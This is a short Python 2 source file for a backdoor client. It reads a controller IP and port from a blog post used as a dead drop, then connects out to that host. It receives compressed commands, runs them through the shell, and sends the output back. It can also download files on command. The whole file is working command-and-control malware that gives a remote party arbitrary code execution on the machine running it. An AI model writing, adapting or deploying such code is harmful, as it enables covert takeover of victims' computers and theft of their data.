import subprocess
import socket
import threading
import urllib2
import zlib
import urllib
import tempfile
import os
def wget(url, fname=None):
    if not fname:
        fname = url.split('/')[-1]
        try:
            urllib.urlretrieve(url, tempfile.gettempdir()+os.sep+fname)
        except:
            pass
def runner(s, cmd):
    try:
        proc = subprocess.Popen(cmd, shell=True, \
                stdout=subprocess.PIPE,\
                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    except:
        pass
    out = zlib.compress(proc.stdout.read() + proc.stderr.read())
    s.send(out)
def getInfo():
    html = urllib2.urlopen('http://q02.blogspot.kr/2015/08/info.html').read()
    content_offset = html.find('description articleBody')
    info_start = content_offset + html[content_offset:].find('>')+2
    info_end = info_start + html[info_start:].find('\n')
    info = html[info_start:info_end].split('/')
    ip = info[0]
    port = int(info[1])
    return ip, port
def main():
    while True:
        try:
            s.connect((HOST, PORT))
        except:
            pass
        else:
            break
    while True:
        cmd = zlib.decompress(s.recv(1024))
        print cmd
        if 'q' == cmd:
            s.close()
            break
        if 'run' in cmd:
            runCmd = cmd[3:]
            t = threading.Thread(target=runner, args=(s, runCmd,))
            threads.append(t)
            t.start()
        if 'wget' in cmd:
            cmds = cmd.split(' ')
            if len(cmds) == 3:
                wget(cmds[1], cmds[2])
                wget(cmds[1])
HOST, PORT = getInfo()
threads = []
s = socket.socket()
if __name__ == '__main__':
    main()
